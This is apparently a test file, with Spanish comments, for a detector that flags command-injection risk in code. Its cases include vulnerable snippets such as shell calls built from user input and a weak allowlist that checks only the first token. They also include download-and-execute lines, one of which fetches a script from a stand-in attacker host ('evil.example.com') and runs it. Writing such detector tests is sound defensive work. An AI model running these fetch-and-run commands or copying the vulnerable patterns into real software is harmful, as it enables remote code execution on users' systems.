"use strict";
// Pruebas para lib/command-injection.js — el motor de detect_command_injection_risk.
//
// Correr con: node test-command-injection.js

const assert = require('assert');
const { checkCommandInjectionRisk } = require('./lib/command-injection');

let pass = 0;
let fail = 0;

function test(name, fn) {
  try {
    fn();
    pass++;
    console.log('OK   - ' + name);
  } catch (err) {
    fail++;
    console.log('FAIL - ' + name);
    console.log('       ' + (err && err.stack ? err.stack : err));
  }
}

// ---------- Casos positivos (deben marcar riesgo) ----------

test('os.system con concatenación de una variable -> alto riesgo', () => {
  const r = checkCommandInjectionRisk({
    codigo: `
def borrar(path):
    os.system("rm -rf " + path)
    `
  });
  assert.strictEqual(r.veredicto, 'Alto riesgo');
});

test('child_process.exec con template literal interpolado -> alto riesgo', () => {
  const r = checkCommandInjectionRisk({
    codigo: `
      function buscar(nombre) {
        exec(\`grep -r \${nombre} /var/log\`, (err, stdout) => callback(stdout));
      }
    `
  });
  assert.strictEqual(r.veredicto, 'Alto riesgo');
});

test('spawn con { shell: true } y comando variable -> alto riesgo', () => {
  const r = checkCommandInjectionRisk({
    codigo: `
      const { spawn } = require('child_process');
      function run(input) {
        return spawn(input, { shell: true });
      }
    `
  });
  assert.strictEqual(r.veredicto, 'Alto riesgo');
});

test('patrón CVE-2026-55581: lista permitida que solo revisa el primer token -> riesgo (no aceptable)', () => {
  const r = checkCommandInjectionRisk({
    codigo: `
      const ALLOWED_COMMANDS = ['ls', 'pwd', 'whoami'];
      function runCommand(userCmd) {
        const primary = userCmd.trim().split(' ')[0];
        if (!ALLOWED_COMMANDS.includes(primary)) {
          throw new Error('Comando no permitido');
        }
        return execSync(userCmd, { shell: '/bin/bash' });
      }
    `
  });
  assert.ok(r.puntaje < 100, 'puntaje=' + r.puntaje);
});

test('patrón "descargar y ejecutar" (curl | bash) hardcodeado -> alto riesgo', () => {
  const r = checkCommandInjectionRisk({
    codigo: `exec('curl -fsSL https://ejemplo.com/install.sh | bash');`
  });
  assert.strictEqual(r.veredicto, 'Alto riesgo');
});

test('subprocess.run con shell=<variable> (no literal True) -> se detecta como riesgo, no 0 operaciones', () => {
  const r = checkCommandInjectionRisk({
    codigo: `
def ejecutar(comando_usuario, usar_shell):
    subprocess.run(comando_usuario, shell=usar_shell)
    `
  });
  assert.ok(r.puntaje < 100, 'puntaje=' + r.puntaje);
  assert.ok(r.resumen.indexOf('0 ejecución') === -1, 'resumen=' + r.resumen);
});

test('patrón "descargar y ejecutar" vía sustitución de comandos $(...) (sin pipe) -> alto riesgo', () => {
  const r = checkCommandInjectionRisk({
    codigo: `exec('bash -c "$(curl -fsSL https://evil.example.com/install.sh)"');`
  });
  assert.strictEqual(r.veredicto, 'Alto riesgo');
});

test('combinación de varios problemas puntúa peor que uno solo', () => {
  const soloUno = checkCommandInjectionRisk({
    codigo: `os.system("ls " + carpeta)`
  });
  const combinado = checkCommandInjectionRisk({
    codigo: `
      os.system("ls " + carpeta)
      os.system("wget http://x.com/s.sh | sh")
    `
  });
  assert.ok(combinado.puntaje < soloUno.puntaje, 'combinado=' + combinado.puntaje + ' solo=' + soloUno.puntaje);
});

// ---------- Casos negativos (no deben marcar riesgo — evitar falsos positivos) ----------

test('os.system con un comando fijo (string literal) -> aceptable', () => {
  const r = checkCommandInjectionRisk({
    codigo: `os.system('service nginx restart')`
  });
  assert.strictEqual(r.veredicto, 'Aceptable');
  assert.strictEqual(r.puntaje, 100);
});

test('subprocess.run con lista de argumentos, sin shell=True -> aceptable (forma segura)', () => {
  const r = checkCommandInjectionRisk({
    codigo: `
def buscar(nombre_archivo):
    subprocess.run(['grep', '-l', nombre_archivo, '/var/log/app.log'], check=True)
    `
  });
  assert.strictEqual(r.veredicto, 'Aceptable');
  assert.strictEqual(r.puntaje, 100);
});

test('execFile con arreglo de argumentos, sin shell:true -> aceptable (forma segura)', () => {
  const r = checkCommandInjectionRisk({
    codigo: `
      const { execFile } = require('child_process');
      function run(userInput) {
        execFile('ls', ['-la', userInput], (err, stdout) => callback(stdout));
      }
    `
  });
  assert.strictEqual(r.veredicto, 'Aceptable');
  assert.strictEqual(r.puntaje, 100);
});

test('escapado con shlex.quote antes de subprocess.run con shell=True -> aceptable', () => {
  const r = checkCommandInjectionRisk({
    codigo: `
import shlex, subprocess
def extraer(nombre_archivo):
    comando_seguro = shlex.quote(nombre_archivo)
    subprocess.run(f"tar -xf {comando_seguro}", shell=True)
    `
  });
  assert.strictEqual(r.veredicto, 'Aceptable');
});

test('validado con lista de permitidos completa + filtro de metacaracteres -> aceptable', () => {
  const r = checkCommandInjectionRisk({
    codigo: `
      const ALLOWED_COMMANDS = ['ls', 'pwd'];
      function run(userCmd) {
        if (!ALLOWED_COMMANDS.includes(userCmd)) throw new Error('no permitido');
        if (/[;&|\`$()]/.test(userCmd)) throw new Error('caracteres no permitidos');
        return execSync(userCmd);
      }
    `
  });
  assert.strictEqual(r.veredicto, 'Aceptable');
  assert.strictEqual(r.puntaje, 100);
});

test('código sin ninguna ejecución de comandos -> aceptable', () => {
  const r = checkCommandInjectionRisk({
    codigo: `function sumar(a, b) { return a + b; }`
  });
  assert.strictEqual(r.veredicto, 'Aceptable');
  assert.strictEqual(r.puntaje, 100);
});

test('texto vacío -> lanza error', () => {
  assert.throws(() => checkCommandInjectionRisk({ codigo: '' }));
  assert.throws(() => checkCommandInjectionRisk({}));
});

console.log('\n' + pass + ' pasaron, ' + fail + ' fallaron.');
if (fail > 0) process.exit(1);
